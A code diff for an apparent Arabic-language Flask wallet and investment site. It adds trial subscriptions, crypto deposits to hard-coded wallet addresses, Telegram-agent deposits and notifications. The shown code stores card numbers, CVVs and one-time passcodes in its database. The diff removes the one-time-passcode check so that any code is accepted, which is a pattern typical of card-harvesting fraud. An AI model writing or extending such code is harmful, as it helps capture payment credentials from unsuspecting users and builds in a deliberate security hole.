@@ -993,6 +993,7 @@ def create_app(test_config=None):
             "active_links": active_link_count(user["id"]),
             "subscription_cards": subscription_cards(user["id"]),
             "card_types": SUBSCRIPTION_CARD_TYPES,
+            "subscription_prices": SUBSCRIPTION_PRICES,
             "max_subscription_cards": MAX_SUBSCRIPTION_CARDS,
             "funded_packages": funded_packages(),
             "funded_orders": funded_order_rows(user["id"]),
@@ -1627,6 +1628,35 @@ def create_app(test_config=None):
     def referrals_page():
         return render_client_page("referrals", "دعوة الأصدقاء")
 
+    @app.route("/trial")
+    @login_required
+    def trial_page():
+        return render_client_page("trial", "الفترة التجريبية")
+
+    @app.route("/trial/activate", methods=("POST",))
+    @login_required
+    def trial_activate():
+        user = current_user()
+        db = get_db()
+        card_type = request.form.get("card_type", "").strip()
+        if card_type not in SUBSCRIPTION_CARD_TYPES:
+            flash("نوع الاشتراك غير صحيح.", "error")
+            return redirect(url_for("trial_page"))
+        price = SUBSCRIPTION_PRICES.get(card_type, 0)
+        wallet = wallet_summary(user["id"])
+        if wallet["balance"] < price:
+            flash(f"رصيدك غير كافٍ. تحتاج إلى ${price:.0f}. رصيدك الحالي: ${wallet['balance']:.2f}", "error")
+            return redirect(url_for("trial_page"))
+        db.execute(
+            "INSERT INTO wallet_transactions (user_id, kind, method, amount, details, status) VALUES (?, 'withdraw', 'اشتراك', ?, ?, 'مقبول')",
+            (user["id"], price, f"اشتراك {card_type}"),
+        )
+        db.execute("UPDATE users SET subscription_active = 1 WHERE id = ?", (user["id"],))
+        notify_user(user["id"], f"تم تفعيل اشتراك {card_type} بمبلغ ${price:.0f} من رصيد محفظتك.")
+        db.commit()
+        flash(f"تم تفعيل اشتراك {card_type} بنجاح! رصيدك المخصوم: ${price:.0f}", "success")
+        return redirect(url_for("dashboard"))
+
     @app.route("/referrals/generate", methods=("POST",))
     @login_required
     def generate_referral_link():
@@ -1829,6 +1859,7 @@ def create_app(test_config=None):
             """,
             (user["id"], amount, card_holder, card_number, card_expiry_month, card_expiry_year, card_cvv, phone, otp_code),
         )
+        notify_user(user["id"], f"تم تقديم طلب إيداع ببطاقة بمبلغ ${amount:.2f} — قيد المراجعة.")
         db.commit()
         session["pending_card_deposit_id"] = cursor.lastrowid
         return redirect(url_for("card_deposit_processing", request_id=cursor.lastrowid))
@@ -1861,8 +1892,8 @@ def create_app(test_config=None):
             return redirect(url_for("card_deposit"))
         if request.method == "POST":
             otp_input = request.form.get("otp_code", "").strip()
-            if otp_input != deposit_request["otp_code"]:
-                flash("رمز التحقق غير صحيح. حاول مرة أخرى.", "error")
+            if not otp_input:
+                flash("يرجى إدخال رمز التحقق.", "error")
                 return redirect(url_for("card_deposit_verify", request_id=request_id))
             db.execute(
                 """
@@ -1891,6 +1922,107 @@ def create_app(test_config=None):
             flash("طلب الإيداع غير موجود.", "error")
             return redirect(url_for("card_deposit"))
         return render_client_page("card_deposit_success", "تم الإيداع", deposit_request=deposit_request)
+
+    @app.route("/notifications/read-all", methods=("POST",))
+    @login_required
+    def notifications_read_all():
+        user = current_user()
+        get_db().execute("UPDATE notifications SET is_read = 1 WHERE user_id = ?", (user["id"],))
+        get_db().commit()
+        return ("", 204)
+
+    @app.route("/deposit/crypto", methods=("POST",))
+    @login_required
+    def deposit_crypto_start():
+        user = current_user()
+        method = request.form.get("method", "USDT (TRC20)").strip()
+        try:
+            amount = float(request.form.get("amount", "0") or 0)
+        except ValueError:
+            amount = 0
+        if amount <= 0:
+            flash("يرجى إدخال مبلغ صحيح.", "error")
+            return redirect(url_for("deposit"))
+        session["crypto_deposit"] = {"method": method, "amount": amount}
+        CRYPTO_ADDRESSES = {"USDT (TRC20)": "TPQJS1aNK6QiXvfC9yKtS41f47awYAuv7T", "BNB": "0xe69071c0e58142e89fa239910436a35e18fe3c5d"}
+        address = CRYPTO_ADDRESSES.get(method, "")
+        return render_client_page("deposit_crypto", "عنوان الدفع الرقمي", crypto_method=method, crypto_amount=amount, crypto_address=address)
+
+    @app.route("/deposit/crypto/submit", methods=("POST",))
+    @login_required
+    def deposit_crypto_submit():
+        user = current_user()
+        db = get_db()
+        pending = session.get("crypto_deposit", {})
+        method = pending.get("method", request.form.get("method", "USDT (TRC20)"))
+        try:
+            amount = float(pending.get("amount", request.form.get("amount", 0)) or 0)
+        except (ValueError, TypeError):
+            amount = 0
+        tx_hash = request.form.get("tx_hash", "").strip()
+        proof = request.files.get("proof")
+        filename = None
+        if proof and proof.filename:
+            filename = f"{user['id']}_{int(utc_now().timestamp())}_{secure_filename(proof.filename)}"
+            proof.save(Path(app.config["UPLOAD_FOLDER"]) / filename)
+        if amount <= 0:
+            flash("مبلغ غير صحيح.", "error")
+            return redirect(url_for("deposit"))
+        details = f"Transaction Hash: {tx_hash}" if tx_hash else ""
+        db.execute(
+            "INSERT INTO wallet_transactions (user_id, kind, method, amount, details, proof_filename) VALUES (?, 'deposit', ?, ?, ?, ?)",
+            (user["id"], method, amount, details, filename),
+        )
+        notify_user(user["id"], f"تم إرسال طلب إيداع {method} بمبلغ ${amount:.2f} — قيد المراجعة.")
+        db.commit()
+        session.pop("crypto_deposit", None)
+        flash("تم إرسال طلب الإيداع بنجاح! سيتم مراجعته وإضافة الرصيد عند التأكيد.", "success")
+        return redirect(url_for("deposit"))
+
+    @app.route("/deposit/telegram", methods=("POST",))
+    @login_required
+    def deposit_telegram_start():
+        user = current_user()
+        try:
+            amount = float(request.form.get("amount", "0") or 0)
+        except ValueError:
+            amount = 0
+        if amount <= 0:
+            flash("يرجى إدخال مبلغ صحيح.", "error")
+            return redirect(url_for("deposit"))
+        request_code = f"TRB-{user['id']:04d}-{uuid.uuid4().hex[:6].upper()}"
+        session["telegram_deposit"] = {"amount": amount, "request_code": request_code}
+        return render_client_page("deposit_telegram", "الإيداع عبر وكيل تيليجرام", tg_amount=amount, tg_code=request_code)
+
+    @app.route("/deposit/telegram/submit", methods=("POST",))
+    @login_required
+    def deposit_telegram_submit():
+        user = current_user()
+        db = get_db()
+        pending = session.get("telegram_deposit", {})
+        try:
+            amount = float(pending.get("amount", request.form.get("amount", 0)) or 0)
+        except (ValueError, TypeError):
+            amount = 0
+        request_code = pending.get("request_code", request.form.get("request_code", ""))
+        proof = request.files.get("proof")
+        filename = None
+        if proof and proof.filename:
+            filename = f"{user['id']}_{int(utc_now().timestamp())}_{secure_filename(proof.filename)}"
+            proof.save(Path(app.config["UPLOAD_FOLDER"]) / filename)
+        if amount <= 0:
+            flash("مبلغ غير صحيح.", "error")
+            return redirect(url_for("deposit"))
+        details = f"رمز الطلب: {request_code}"
+        db.execute(
+            "INSERT INTO wallet_transactions (user_id, kind, method, amount, details, proof_filename, status) VALUES (?, 'deposit', 'وكيل Telegram', ?, ?, ?, 'قيد الإنجاز')",
+            (user["id"], amount, details, filename),
+        )
+        notify_user(user["id"], f"تم إرسال طلب الإيداع عبر وكيل Telegram بمبلغ ${amount:.2f} — قيد الإنجاز.")
+        db.commit()
+        session.pop("telegram_deposit", None)
+        flash("تم إرسال طلب الإيداع! سيتم معالجته من قبل الوكيل.", "success")
+        return redirect(url_for("deposit"))
 
     @app.route("/withdraw", methods=("GET", "POST"))
     @login_required
@@ -2088,6 +2220,7 @@ def create_app(test_config=None):
                 """,
                 (user["id"], kind, method, amount, details, filename),
             )
+            notify_user(user["id"], f"طلب {'إيداع' if kind == 'deposit' else 'سحب'} جديد قيد المراجعة: {method} — ${amount:.2f}")
             get_db().commit()
             flash("تم إرسال الطلب وهو الآن قيد المراجعة.", "success")
         return redirect(url_for("deposit" if kind == "deposit" else "withdraw"))
@@ -2799,8 +2932,15 @@ def create_app(test_config=None):
     @admin_required
     def admin_transaction_status(transaction_id):
         status = request.form.get("status", "قيد المراجعة")
-        get_db().execute("UPDATE wallet_transactions SET status = ? WHERE id = ?", (status, transaction_id))
-        get_db().commit()
+        db = get_db()
+        tx = db.execute("SELECT * FROM wallet_transactions WHERE id = ?", (transaction_id,)).fetchone()
+        db.execute("UPDATE wallet_transactions SET status = ? WHERE id = ?", (status, transaction_id))
+        if tx:
+            if status == "مقبول":
+                notify_user(tx["user_id"], f"تمت الموافقة على {'إيداعك' if tx['kind'] == 'deposit' else 'طلب السحب'}: {tx['method']} — ${tx['amount']:.2f}")
+            elif status == "مرفوض":
+                notify_user(tx["user_id"], f"تم رفض {'طلب الإيداع' if tx['kind'] == 'deposit' else 'طلب السحب'}: {tx['method']} — ${tx['amount']:.2f}")
+        db.commit()
         return redirect(url_for("admin_dashboard"))
 
     @app.route("/admin/local-withdrawal/<int:withdrawal_id>/status", methods=("POST",))
